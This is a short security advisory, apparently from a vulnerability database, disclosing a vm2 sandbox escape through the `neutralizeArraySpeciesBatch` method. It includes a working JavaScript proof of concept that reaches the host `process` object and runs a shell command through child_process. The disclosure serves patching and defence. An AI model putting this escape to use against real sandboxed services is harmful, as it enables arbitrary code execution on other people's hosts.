summary: "vm2 has sandbox breakout via `neutralizeArraySpeciesBatch`\n### Summary\n\nVM2 suffers\
  \ from a sandbox breakout vulnerability. This allows attackers to write code which can escape\
  \ from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\
  \nThe new method `neutralizeArraySpeciesBatch` works with objects from the other side but\
  \ can call into this side via getter on the array prototype exposing objects of the wrong\
  \ side into the sandbox. This can be used to get host objects and get the host `Function`\
  \ object.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nconsole.log(vm.run(`\n\
  const a = [];\nObject.defineProperty(Array.prototype, 0, {\n\tset(value) {\n\t\ta.f = Buffer.prototype.inspect;\n\
  \t\tvalue.arr.f.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch\
  \ pwned');\n\t}\n});\nnew Buffer(a);\n`));\n```\n\n### Impact\n\nAttackers can perform Remote\
  \ Code Execution under the assumption that arbitrary code can be executed inside the context\
  \ of a vm2 sandbox."
